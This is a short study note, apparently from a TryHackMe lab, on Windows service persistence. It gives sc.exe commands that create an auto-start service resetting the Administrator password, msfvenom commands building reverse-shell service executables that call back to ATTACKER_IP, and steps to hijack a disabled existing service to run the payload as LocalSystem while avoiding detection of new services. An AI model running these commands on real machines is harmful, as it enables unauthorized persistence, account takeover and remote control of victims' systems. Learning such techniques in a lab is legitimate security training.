#cybersecurity #windows 

Services can run in background when victim machine is started

Services are basically executable that runs in the background.

### Creating backdoor services

```powershell

sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto

sc.exe start THMservice

```
**Note:** There must be a space after each equal sign for the command to work.

The net user command will be executed when the service is started, resetting the Administrator password to Passwd123

We can create a reverse shell with msfvenom

```bash
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Then we can copy the executable to the target machine and point the service binPath to it
```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```


### Modifying existing services
Blue team may monitor new service creation across the network

So we use an existing service, disabled ones are a good choice

```
sc.exe query state=all
```

There are three things we care about when using a service for persistence:

- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The service **START_TYPE** should be automatic so that the payload runs without user interaction.
- The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

Let's create a new reverse shell with msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

And then we reconfigure the target service 

```powershell
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```